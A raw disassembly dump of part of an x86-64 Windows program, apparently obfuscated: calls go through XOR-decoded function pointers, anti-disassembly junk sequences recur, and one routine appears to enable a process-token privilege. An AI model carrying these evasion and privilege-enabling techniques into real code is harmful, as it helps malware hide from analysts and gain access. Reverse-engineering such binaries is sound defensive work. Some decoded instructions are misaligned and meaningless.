  40174a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40174e:	48 8d 05 97 7a 00 00 	lea    0x7a97(%rip),%rax        # 0x4091ec
  401755:	49 89 c2             	mov    %rax,%r10
  401758:	4c 89 d1             	mov    %r10,%rcx
  40175b:	4c 8b 1d 7e 9b 00 00 	mov    0x9b7e(%rip),%r11        # 0x40b2e0
  401762:	48 8b 05 9f 9b 00 00 	mov    0x9b9f(%rip),%rax        # 0x40b308
  401769:	4c 33 18             	xor    (%rax),%r11
  40176c:	41 ff d3             	call   *%r11
  40176f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401773:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401777:	48 83 f8 00          	cmp    $0x0,%rax
  40177b:	0f 85 07 00 00 00    	jne    0x401788
  401781:	31 c0                	xor    %eax,%eax
  401783:	e9 ca 00 00 00       	jmp    0x401852
  401788:	48 8d 05 79 7a 00 00 	lea    0x7a79(%rip),%rax        # 0x409208
  40178f:	49 89 c3             	mov    %rax,%r11
  401792:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401796:	49 89 c2             	mov    %rax,%r10
  401799:	4c 89 d1             	mov    %r10,%rcx
  40179c:	4c 89 da             	mov    %r11,%rdx
  40179f:	4c 8b 1d 72 9b 00 00 	mov    0x9b72(%rip),%r11        # 0x40b318
  4017a6:	48 8b 05 93 9b 00 00 	mov    0x9b93(%rip),%rax        # 0x40b340
  4017ad:	4c 33 18             	xor    (%rax),%r11
  4017b0:	41 ff d3             	call   *%r11
  4017b3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4017b7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4017bb:	48 83 f8 00          	cmp    $0x0,%rax
  4017bf:	0f 85 07 00 00 00    	jne    0x4017cc
  4017c5:	31 c0                	xor    %eax,%eax
  4017c7:	e9 86 00 00 00       	jmp    0x401852
  4017cc:	8b 45 fc             	mov    -0x4(%rbp),%eax
  4017cf:	49 89 c3             	mov    %rax,%r11
  4017d2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4017d6:	49 89 c2             	mov    %rax,%r10
  4017d9:	4c 89 d1             	mov    %r10,%rcx
  4017dc:	4c 89 da             	mov    %r11,%rdx
  4017df:	4c 8b 1d 6a 9b 00 00 	mov    0x9b6a(%rip),%r11        # 0x40b350
  4017e6:	48 8b 05 8b 9b 00 00 	mov    0x9b8b(%rip),%rax        # 0x40b378
  4017ed:	4c 33 18             	xor    (%rax),%r11
  4017f0:	41 ff d3             	call   *%r11
  4017f3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4017f7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4017fb:	48 83 f8 00          	cmp    $0x0,%rax
  4017ff:	0f 85 07 00 00 00    	jne    0x40180c
  401805:	31 c0                	xor    %eax,%eax
  401807:	e9 46 00 00 00       	jmp    0x401852
  40180c:	48 8d 45 fc          	lea    -0x4(%rbp),%rax
  401810:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401815:	8b 45 fc             	mov    -0x4(%rbp),%eax
  401818:	49 89 c1             	mov    %rax,%r9
  40181b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40181f:	49 89 c0             	mov    %rax,%r8
  401822:	8b 45 18             	mov    0x18(%rbp),%eax
  401825:	49 89 c3             	mov    %rax,%r11
  401828:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40182c:	49 89 c2             	mov    %rax,%r10
  40182f:	4c 89 d1             	mov    %r10,%rcx
  401832:	4c 89 da             	mov    %r11,%rdx
  401835:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
  401839:	41 ff d3             	call   *%r11
  40183c:	89 45 f8             	mov    %eax,-0x8(%rbp)
  40183f:	8b 45 f8             	mov    -0x8(%rbp),%eax
  401842:	81 f8 04 00 00 c0    	cmp    $0xc0000004,%eax
  401848:	0f 84 7e ff ff ff    	je     0x4017cc
  40184e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401852:	c9                   	leave
  401853:	c3                   	ret
  401854:	cc                   	int3
  401855:	cc                   	int3
  401856:	e8 00 00 00 00       	call   0x40185b
  40185b:	48 83 c4 08          	add    $0x8,%rsp
  40185f:	c3                   	ret
  401860:	90                   	nop
  401861:	90                   	nop
  401862:	cc                   	int3
  401863:	90                   	nop
  401864:	eb 0b                	jmp    0x401871
  401866:	48 31 c0             	xor    %rax,%rax
  401869:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401870:	90                   	nop
  401871:	55                   	push   %rbp
  401872:	48 89 e5             	mov    %rsp,%rbp
  401875:	48 81 ec 60 00 00 00 	sub    $0x60,%rsp
  40187c:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401880:	b8 00 00 00 00       	mov    $0x0,%eax
  401885:	89 45 fc             	mov    %eax,-0x4(%rbp)
  401888:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40188c:	48 83 c0 20          	add    $0x20,%rax
  401890:	b9 01 00 00 00       	mov    $0x1,%ecx
  401895:	49 89 c8             	mov    %rcx,%r8
  401898:	48 8d 4d fc          	lea    -0x4(%rbp),%rcx
  40189c:	49 89 cb             	mov    %rcx,%r11
  40189f:	49 89 c2             	mov    %rax,%r10
  4018a2:	4c 89 d1             	mov    %r10,%rcx
  4018a5:	4c 89 da             	mov    %r11,%rdx
  4018a8:	4c 8b 1d 01 ad 00 00 	mov    0xad01(%rip),%r11        # 0x40c5b0
  4018af:	48 8b 05 22 ad 00 00 	mov    0xad22(%rip),%rax        # 0x40c5d8
  4018b6:	4c 33 18             	xor    (%rax),%r11
  4018b9:	41 ff d3             	call   *%r11
  4018bc:	8b 45 fc             	mov    -0x4(%rbp),%eax
  4018bf:	49 89 c2             	mov    %rax,%r10
  4018c2:	4c 89 d1             	mov    %r10,%rcx
  4018c5:	4c 8b 1d 1c ad 00 00 	mov    0xad1c(%rip),%r11        # 0x40c5e8
  4018cc:	48 8b 05 3d ad 00 00 	mov    0xad3d(%rip),%rax        # 0x40c610
  4018d3:	4c 33 18             	xor    (%rax),%r11
  4018d6:	41 ff d3             	call   *%r11
  4018d9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4018dd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4018e1:	48 83 f8 00          	cmp    $0x0,%rax
  4018e5:	0f 85 05 00 00 00    	jne    0x4018f0
  4018eb:	e9 a1 02 00 00       	jmp    0x401b91
  4018f0:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4018f4:	48 83 c0 20          	add    $0x20,%rax
  4018f8:	8b 4d fc             	mov    -0x4(%rbp),%ecx
  4018fb:	49 89 c8             	mov    %rcx,%r8
  4018fe:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  401902:	49 89 cb             	mov    %rcx,%r11
  401905:	49 89 c2             	mov    %rax,%r10
  401908:	4c 89 d1             	mov    %r10,%rcx
  40190b:	4c 89 da             	mov    %r11,%rdx
  40190e:	4c 8b 1d 0b ad 00 00 	mov    0xad0b(%rip),%r11        # 0x40c620
  401915:	48 8b 05 2c ad 00 00 	mov    0xad2c(%rip),%rax        # 0x40c648
  40191c:	4c 33 18             	xor    (%rax),%r11
  40191f:	41 ff d3             	call   *%r11
  401922:	b8 00 00 00 00       	mov    $0x0,%eax
  401927:	89 45 ec             	mov    %eax,-0x14(%rbp)
  40192a:	48 8b 45 10          	mov    0x10(%rbp),%rax
  40192e:	48 83 c0 20          	add    $0x20,%rax
  401932:	b9 04 00 00 00       	mov    $0x4,%ecx
  401937:	49 89 c8             	mov    %rcx,%r8
  40193a:	48 8d 4d ec          	lea    -0x14(%rbp),%rcx
  40193e:	49 89 cb             	mov    %rcx,%r11
  401941:	49 89 c2             	mov    %rax,%r10
  401944:	4c 89 d1             	mov    %r10,%rcx
  401947:	4c 89 da             	mov    %r11,%rdx
  40194a:	4c 8b 1d 07 ad 00 00 	mov    0xad07(%rip),%r11        # 0x40c658
  401951:	48 8b 05 28 ad 00 00 	mov    0xad28(%rip),%rax        # 0x40c680
  401958:	4c 33 18             	xor    (%rax),%r11
  40195b:	41 ff d3             	call   *%r11
  40195e:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401962:	48 83 c0 20          	add    $0x20,%rax
  401966:	8b 4d ec             	mov    -0x14(%rbp),%ecx
  401969:	49 89 c9             	mov    %rcx,%r9
  40196c:	48 8b 00             	mov    (%rax),%rax
  40196f:	49 89 c0             	mov    %rax,%r8
  401972:	8b 45 fc             	mov    -0x4(%rbp),%eax
  401975:	49 89 c3             	mov    %rax,%r11
  401978:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40197c:	49 89 c2             	mov    %rax,%r10
  40197f:	4c 89 d1             	mov    %r10,%rcx
  401982:	4c 89 da             	mov    %r11,%rdx
  401985:	4c 8b 1d 04 ad 00 00 	mov    0xad04(%rip),%r11        # 0x40c690
  40198c:	48 8b 05 25 ad 00 00 	mov    0xad25(%rip),%rax        # 0x40c6b8
  401993:	4c 33 18             	xor    (%rax),%r11
  401996:	41 ff d3             	call   *%r11
  401999:	b8 00 00 00 00       	mov    $0x0,%eax
  40199e:	89 45 e8             	mov    %eax,-0x18(%rbp)
  4019a1:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4019a4:	c1 e0 01             	shl    $0x1,%eax
  4019a7:	49 89 c2             	mov    %rax,%r10
  4019aa:	4c 89 d1             	mov    %r10,%rcx
  4019ad:	4c 8b 1d 14 ad 00 00 	mov    0xad14(%rip),%r11        # 0x40c6c8
  4019b4:	48 8b 05 35 ad 00 00 	mov    0xad35(%rip),%rax        # 0x40c6f0
  4019bb:	4c 33 18             	xor    (%rax),%r11
  4019be:	41 ff d3             	call   *%r11
  4019c1:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4019c5:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4019c9:	48 83 f8 00          	cmp    $0x0,%rax
  4019cd:	0f 85 23 00 00 00    	jne    0x4019f6
  4019d3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4019d7:	49 89 c2             	mov    %rax,%r10
  4019da:	4c 89 d1             	mov    %r10,%rcx
  4019dd:	4c 8b 1d 1c ad 00 00 	mov    0xad1c(%rip),%r11        # 0x40c700
  4019e4:	48 8b 05 3d ad 00 00 	mov    0xad3d(%rip),%rax        # 0x40c728
  4019eb:	4c 33 18             	xor    (%rax),%r11
  4019ee:	41 ff d3             	call   *%r11
  4019f1:	e9 9b 01 00 00       	jmp    0x401b91
  4019f6:	8b 45 ec             	mov    -0x14(%rbp),%eax
  4019f9:	c1 e0 01             	shl    $0x1,%eax
  4019fc:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401a00:	48 83 c1 20          	add    $0x20,%rcx
  401a04:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
  401a08:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  401a0d:	8b 55 ec             	mov    -0x14(%rbp),%edx
  401a10:	49 89 d1             	mov    %rdx,%r9
  401a13:	48 8b 09             	mov    (%rcx),%rcx
  401a16:	49 89 c8             	mov    %rcx,%r8
  401a19:	49 89 c3             	mov    %rax,%r11
  401a1c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401a20:	49 89 c2             	mov    %rax,%r10
  401a23:	4c 89 d1             	mov    %r10,%rcx
  401a26:	4c 89 da             	mov    %r11,%rdx
  401a29:	4c 8b 1d 08 ad 00 00 	mov    0xad08(%rip),%r11        # 0x40c738
  401a30:	48 8b 05 29 ad 00 00 	mov    0xad29(%rip),%rax        # 0x40c760
  401a37:	4c 33 18             	xor    (%rax),%r11
  401a3a:	41 ff d3             	call   *%r11
  401a3d:	4c 8b 1d 2c ad 00 00 	mov    0xad2c(%rip),%r11        # 0x40c770
  401a44:	48 8b 05 4d ad 00 00 	mov    0xad4d(%rip),%rax        # 0x40c798
  401a4b:	4c 33 18             	xor    (%rax),%r11
  401a4e:	41 ff d3             	call   *%r11
  401a51:	b8 01 00 00 00       	mov    $0x1,%eax
  401a56:	49 89 c3             	mov    %rax,%r11
  401a59:	48 8d 05 22 7c 00 00 	lea    0x7c22(%rip),%rax        # 0x409682
  401a60:	49 89 c2             	mov    %rax,%r10
  401a63:	4c 89 d1             	mov    %r10,%rcx
  401a66:	4c 89 da             	mov    %r11,%rdx
  401a69:	4c 8b 1d 38 ad 00 00 	mov    0xad38(%rip),%r11        # 0x40c7a8
  401a70:	48 8b 05 59 ad 00 00 	mov    0xad59(%rip),%rax        # 0x40c7d0
  401a77:	4c 33 18             	xor    (%rax),%r11
  401a7a:	41 ff d3             	call   *%r11
  401a7d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401a81:	48 83 c0 14          	add    $0x14,%rax
  401a85:	8b 00                	mov    (%rax),%eax
  401a87:	83 f8 00             	cmp    $0x0,%eax
  401a8a:	0f 84 89 00 00 00    	je     0x401b19
  401a90:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401a94:	48 83 c0 18          	add    $0x18,%rax
  401a98:	31 c9                	xor    %ecx,%ecx
  401a9a:	48 89 08             	mov    %rcx,(%rax)
  401a9d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401aa1:	49 89 c2             	mov    %rax,%r10
  401aa4:	4c 89 d1             	mov    %r10,%rcx
  401aa7:	4c 8b 1d 32 ad 00 00 	mov    0xad32(%rip),%r11        # 0x40c7e0
  401aae:	48 8b 05 53 ad 00 00 	mov    0xad53(%rip),%rax        # 0x40c808
  401ab5:	4c 33 18             	xor    (%rax),%r11
  401ab8:	41 ff d3             	call   *%r11
  401abb:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401abf:	48 83 c0 14          	add    $0x14,%rax
  401ac3:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401ac7:	48 83 c1 18          	add    $0x18,%rcx
  401acb:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
  401ad0:	b9 00 00 00 00       	mov    $0x0,%ecx
  401ad5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
  401ada:	31 c9                	xor    %ecx,%ecx
  401adc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
  401ae1:	8b 4d e8             	mov    -0x18(%rbp),%ecx
  401ae4:	49 89 c9             	mov    %rcx,%r9
  401ae7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
  401aeb:	49 89 c8             	mov    %rcx,%r8
  401aee:	8b 00                	mov    (%rax),%eax
  401af0:	49 89 c3             	mov    %rax,%r11
  401af3:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401af7:	49 89 c2             	mov    %rax,%r10
  401afa:	4c 89 d1             	mov    %r10,%rcx
  401afd:	4c 89 da             	mov    %r11,%rdx
  401b00:	4c 8b 1d 11 ad 00 00 	mov    0xad11(%rip),%r11        # 0x40c818
  401b07:	48 8b 05 32 ad 00 00 	mov    0xad32(%rip),%rax        # 0x40c840
  401b0e:	4c 33 18             	xor    (%rax),%r11
  401b11:	41 ff d3             	call   *%r11
  401b14:	e9 00 00 00 00       	jmp    0x401b19
  401b19:	48 8d 05 9c 7b 00 00 	lea    0x7b9c(%rip),%rax        # 0x4096bc
  401b20:	49 89 c3             	mov    %rax,%r11
  401b23:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401b27:	49 89 c2             	mov    %rax,%r10
  401b2a:	4c 89 d1             	mov    %r10,%rcx
  401b2d:	4c 89 da             	mov    %r11,%rdx
  401b30:	4c 8b 1d 19 ad 00 00 	mov    0xad19(%rip),%r11        # 0x40c850
  401b37:	48 8b 05 3a ad 00 00 	mov    0xad3a(%rip),%rax        # 0x40c878
  401b3e:	4c 33 18             	xor    (%rax),%r11
  401b41:	41 ff d3             	call   *%r11
  401b44:	83 f8 00             	cmp    $0x0,%eax
  401b47:	0f 85 23 00 00 00    	jne    0x401b70
  401b4d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401b51:	49 89 c2             	mov    %rax,%r10
  401b54:	4c 89 d1             	mov    %r10,%rcx
  401b57:	4c 8b 1d 2a ad 00 00 	mov    0xad2a(%rip),%r11        # 0x40c888
  401b5e:	48 8b 05 4b ad 00 00 	mov    0xad4b(%rip),%rax        # 0x40c8b0
  401b65:	4c 33 18             	xor    (%rax),%r11
  401b68:	41 ff d3             	call   *%r11
  401b6b:	e9 1f 00 00 00       	jmp    0x401b8f
  401b70:	b8 e8 03 00 00       	mov    $0x3e8,%eax
  401b75:	49 89 c2             	mov    %rax,%r10
  401b78:	4c 89 d1             	mov    %r10,%rcx
  401b7b:	4c 8b 1d 3e ad 00 00 	mov    0xad3e(%rip),%r11        # 0x40c8c0
  401b82:	48 8b 05 5f ad 00 00 	mov    0xad5f(%rip),%rax        # 0x40c8e8
  401b89:	4c 33 18             	xor    (%rax),%r11
  401b8c:	41 ff d3             	call   *%r11
  401b8f:	eb 88                	jmp    0x401b19
  401b91:	15 7a cf cc e8       	adc    $0xe8cccf7a,%eax
  401b96:	00 00                	add    %al,(%rax)
  401b98:	00 00                	add    %al,(%rax)
  401b9a:	48 83 c4 08          	add    $0x8,%rsp
  401b9e:	c3                   	ret
  401b9f:	90                   	nop
  401ba0:	90                   	nop
  401ba1:	cc                   	int3
  401ba2:	90                   	nop
  401ba3:	eb 0b                	jmp    0x401bb0
  401ba5:	48 31 c0             	xor    %rax,%rax
  401ba8:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401baf:	90                   	nop
  401bb0:	55                   	push   %rbp
  401bb1:	48 89 e5             	mov    %rsp,%rbp
  401bb4:	48 81 ec 40 00 00 00 	sub    $0x40,%rsp
  401bbb:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401bbf:	48 89 55 18          	mov    %rdx,0x18(%rbp)
  401bc3:	4c 89 45 20          	mov    %r8,0x20(%rbp)
  401bc7:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401bcb:	8b 4d 20             	mov    0x20(%rbp),%ecx
  401bce:	81 f1 23 fe aa ca    	xor    $0xcaaafe23,%ecx
  401bd4:	89 08                	mov    %ecx,(%rax)
  401bd6:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401bda:	48 83 c0 08          	add    $0x8,%rax
  401bde:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  401be2:	48 89 08             	mov    %rcx,(%rax)
  401be5:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401be9:	48 83 c0 10          	add    $0x10,%rax
  401bed:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  401bf1:	48 89 08             	mov    %rcx,(%rax)
  401bf4:	31 c0                	xor    %eax,%eax
  401bf6:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401bfa:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401bfe:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
  401c02:	48 39 c8             	cmp    %rcx,%rax
  401c05:	0f 83 da 00 00 00    	jae    0x401ce5
  401c0b:	e9 0e 00 00 00       	jmp    0x401c1e
  401c10:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401c14:	48 83 c0 01          	add    $0x1,%rax
  401c18:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401c1c:	eb dc                	jmp    0x401bfa
  401c1e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401c22:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  401c26:	48 01 c1             	add    %rax,%rcx
  401c29:	0f b6 09             	movzbl (%rcx),%ecx
  401c2c:	49 89 ca             	mov    %rcx,%r10
  401c2f:	4c 89 d1             	mov    %r10,%rcx
  401c32:	4c 8b 1d cf 8c 00 00 	mov    0x8ccf(%rip),%r11        # 0x40a908
  401c39:	48 8b 05 f0 8c 00 00 	mov    0x8cf0(%rip),%rax        # 0x40a930
  401c40:	4c 33 18             	xor    (%rax),%r11
  401c43:	41 ff d3             	call   *%r11
  401c46:	88 45 f7             	mov    %al,-0x9(%rbp)
  401c49:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401c4d:	0f b6 4d f7          	movzbl -0x9(%rbp),%ecx
  401c51:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  401c55:	48 83 e2 03          	and    $0x3,%rdx
  401c59:	48 c1 e2 03          	shl    $0x3,%rdx
  401c5d:	48 c1 e2 20          	shl    $0x20,%rdx
  401c61:	48 c1 ea 20          	shr    $0x20,%rdx
  401c65:	89 4d f0             	mov    %ecx,-0x10(%rbp)
  401c68:	89 d1                	mov    %edx,%ecx
  401c6a:	8b 55 f0             	mov    -0x10(%rbp),%edx
  401c6d:	d3 e2                	shl    %cl,%edx
  401c6f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401c73:	8b 00                	mov    (%rax),%eax
  401c75:	31 d0                	xor    %edx,%eax
  401c77:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  401c7b:	89 01                	mov    %eax,(%rcx)
  401c7d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401c81:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401c85:	8b 09                	mov    (%rcx),%ecx
  401c87:	c1 e1 07             	shl    $0x7,%ecx
  401c8a:	48 8b 55 10          	mov    0x10(%rbp),%rdx
  401c8e:	8b 12                	mov    (%rdx),%edx
  401c90:	c1 ea 19             	shr    $0x19,%edx
  401c93:	09 d1                	or     %edx,%ecx
  401c95:	81 c1 23 aa 57 3d    	add    $0x3d57aa23,%ecx
  401c9b:	89 08                	mov    %ecx,(%rax)
  401c9d:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401ca1:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
  401ca5:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  401ca9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401cad:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
  401cb1:	b9 05 00 00 00       	mov    $0x5,%ecx
  401cb6:	48 31 d2             	xor    %rdx,%rdx
  401cb9:	48 f7 f1             	div    %rcx
  401cbc:	48 83 c2 03          	add    $0x3,%rdx
  401cc0:	48 c1 e2 20          	shl    $0x20,%rdx
  401cc4:	48 c1 ea 20          	shr    $0x20,%rdx
  401cc8:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  401ccc:	8b 00                	mov    (%rax),%eax
  401cce:	89 d1                	mov    %edx,%ecx
  401cd0:	d3 e8                	shr    %cl,%eax
  401cd2:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  401cd6:	8b 09                	mov    (%rcx),%ecx
  401cd8:	31 c1                	xor    %eax,%ecx
  401cda:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  401cde:	89 08                	mov    %ecx,(%rax)
  401ce0:	e9 2b ff ff ff       	jmp    0x401c10
  401ce5:	c9                   	leave
  401ce6:	c3                   	ret
  401ce7:	cc                   	int3
  401ce8:	cc                   	int3
  401ce9:	e8 00 00 00 00       	call   0x401cee
  401cee:	48 83 c4 08          	add    $0x8,%rsp
  401cf2:	c3                   	ret
  401cf3:	90                   	nop
  401cf4:	90                   	nop
  401cf5:	cc                   	int3
  401cf6:	90                   	nop
  401cf7:	eb 0b                	jmp    0x401d04
  401cf9:	48 31 c0             	xor    %rax,%rax
  401cfc:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401d03:	90                   	nop
  401d04:	55                   	push   %rbp
  401d05:	48 89 e5             	mov    %rsp,%rbp
  401d08:	48 81 ec 50 00 00 00 	sub    $0x50,%rsp
  401d0f:	4c 8b 1d 6a 91 00 00 	mov    0x916a(%rip),%r11        # 0x40ae80
  401d16:	48 8b 05 8b 91 00 00 	mov    0x918b(%rip),%rax        # 0x40aea8
  401d1d:	4c 33 18             	xor    (%rax),%r11
  401d20:	41 ff d3             	call   *%r11
  401d23:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
  401d27:	49 89 c8             	mov    %rcx,%r8
  401d2a:	b9 28 00 00 00       	mov    $0x28,%ecx
  401d2f:	49 89 cb             	mov    %rcx,%r11
  401d32:	49 89 c2             	mov    %rax,%r10
  401d35:	4c 89 d1             	mov    %r10,%rcx
  401d38:	4c 89 da             	mov    %r11,%rdx
  401d3b:	4c 8b 1d 76 91 00 00 	mov    0x9176(%rip),%r11        # 0x40aeb8
  401d42:	48 8b 05 97 91 00 00 	mov    0x9197(%rip),%rax        # 0x40aee0
  401d49:	4c 33 18             	xor    (%rax),%r11
  401d4c:	41 ff d3             	call   *%r11
  401d4f:	83 f8 00             	cmp    $0x0,%eax
  401d52:	0f 85 0a 00 00 00    	jne    0x401d62
  401d58:	b8 00 00 00 00       	mov    $0x0,%eax
  401d5d:	e9 c1 00 00 00       	jmp    0x401e23
  401d62:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
  401d66:	49 89 c0             	mov    %rax,%r8
  401d69:	48 8d 05 87 73 00 00 	lea    0x7387(%rip),%rax        # 0x4090f7
  401d70:	49 89 c3             	mov    %rax,%r11
  401d73:	31 c0                	xor    %eax,%eax
  401d75:	49 89 c2             	mov    %rax,%r10
  401d78:	4c 89 d1             	mov    %r10,%rcx
  401d7b:	4c 89 da             	mov    %r11,%rdx
  401d7e:	4c 8b 1d 6b 91 00 00 	mov    0x916b(%rip),%r11        # 0x40aef0
  401d85:	48 8b 05 8c 91 00 00 	mov    0x918c(%rip),%rax        # 0x40af18
  401d8c:	4c 33 18             	xor    (%rax),%r11
  401d8f:	41 ff d3             	call   *%r11
  401d92:	b8 01 00 00 00       	mov    $0x1,%eax
  401d97:	89 45 e8             	mov    %eax,-0x18(%rbp)
  401d9a:	b8 02 00 00 00       	mov    $0x2,%eax
  401d9f:	89 45 f4             	mov    %eax,-0xc(%rbp)
  401da2:	31 c0                	xor    %eax,%eax
  401da4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401da9:	31 c0                	xor    %eax,%eax
  401dab:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401db0:	b8 10 00 00 00       	mov    $0x10,%eax
  401db5:	49 89 c1             	mov    %rax,%r9
  401db8:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  401dbc:	49 89 c0             	mov    %rax,%r8
  401dbf:	b8 00 00 00 00       	mov    $0x0,%eax
  401dc4:	49 89 c3             	mov    %rax,%r11
  401dc7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401dcb:	49 89 c2             	mov    %rax,%r10
  401dce:	4c 89 d1             	mov    %r10,%rcx
  401dd1:	4c 89 da             	mov    %r11,%rdx
  401dd4:	4c 8b 1d 4d 91 00 00 	mov    0x914d(%rip),%r11        # 0x40af28
  401ddb:	48 8b 05 6e 91 00 00 	mov    0x916e(%rip),%rax        # 0x40af50
  401de2:	4c 33 18             	xor    (%rax),%r11
  401de5:	41 ff d3             	call   *%r11
  401de8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401dec:	49 89 c2             	mov    %rax,%r10
  401def:	4c 89 d1             	mov    %r10,%rcx
  401df2:	4c 8b 1d 67 91 00 00 	mov    0x9167(%rip),%r11        # 0x40af60
  401df9:	48 8b 05 88 91 00 00 	mov    0x9188(%rip),%rax        # 0x40af88
  401e00:	4c 33 18             	xor    (%rax),%r11
  401e03:	41 ff d3             	call   *%r11
  401e06:	4c 8b 1d 8b 91 00 00 	mov    0x918b(%rip),%r11        # 0x40af98
  401e0d:	48 8b 05 ac 91 00 00 	mov    0x91ac(%rip),%rax        # 0x40afc0
  401e14:	4c 33 18             	xor    (%rax),%r11
  401e17:	41 ff d3             	call   *%r11
  401e1a:	83 f8 00             	cmp    $0x0,%eax
  401e1d:	0f 94 c0             	sete   %al
  401e20:	0f b6 c0             	movzbl %al,%eax
  401e23:	c9                   	leave
  401e24:	c3                   	ret
  401e25:	cc                   	int3
  401e26:	cc                   	int3
  401e27:	e8 00 00 00 00       	call   0x401e2c
  401e2c:	48 83 c4 08          	add    $0x8,%rsp
  401e30:	c3                   	ret
  401e31:	90                   	nop
  401e32:	90                   	nop
  401e33:	cc                   	int3
  401e34:	90                   	nop
  401e35:	eb 0b                	jmp    0x401e42
  401e37:	48 31 c0             	xor    %rax,%rax
  401e3a:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401e41:	90                   	nop
  401e42:	55                   	push   %rbp
  401e43:	48 89 e5             	mov    %rsp,%rbp
  401e46:	48 81 ec 30 00 00 00 	sub    $0x30,%rsp
  401e4d:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
  401e51:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401e55:	49 89 c2             	mov    %rax,%r10
  401e58:	4c 89 d1             	mov    %r10,%rcx
  401e5b:	4c 8b 1d 06 ab 00 00 	mov    0xab06(%rip),%r11        # 0x40c968
  401e62:	48 8b 05 27 ab 00 00 	mov    0xab27(%rip),%rax        # 0x40c990
  401e69:	4c 33 18             	xor    (%rax),%r11
  401e6c:	41 ff d3             	call   *%r11
  401e6f:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401e73:	48 83 c0 14          	add    $0x14,%rax
  401e77:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401e7b:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401e7f:	49 89 c2             	mov    %rax,%r10
  401e82:	4c 89 d1             	mov    %r10,%rcx
  401e85:	4c 8b 1d 14 ab 00 00 	mov    0xab14(%rip),%r11        # 0x40c9a0
  401e8c:	48 8b 05 35 ab 00 00 	mov    0xab35(%rip),%rax        # 0x40c9c8
  401e93:	4c 33 18             	xor    (%rax),%r11
  401e96:	41 ff d3             	call   *%r11
  401e99:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  401e9d:	89 01                	mov    %eax,(%rcx)
  401e9f:	48 8b 45 10          	mov    0x10(%rbp),%rax
